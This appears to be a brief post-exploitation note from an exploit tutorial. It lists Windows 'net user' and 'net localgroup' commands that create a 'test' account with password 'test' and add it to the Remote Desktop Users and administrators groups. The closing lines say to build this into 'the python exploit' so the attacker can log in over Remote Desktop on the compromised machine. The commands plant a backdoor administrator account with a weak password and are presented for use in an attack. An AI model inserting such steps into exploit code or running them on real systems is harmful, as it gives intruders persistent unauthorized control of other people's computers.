Remote Desktop Way

To add user in windows command is...

net user <username> <password> /add
Example: net user test test /add

To add user to a group for Remote Desktop and Administrators group is...

net localgroup "Remote Desktop Users" UserLoginName /add
net localgroup "administrators" UserLoginName /add

Example: net localgroup "Remote Desktop Users" test /add
Example: net localgroup "administrators" test /add


If you implement this in the python exploit you will actually be able to login via Remote Desktop GUI and that is another way to do it. I like the firewall method better though.

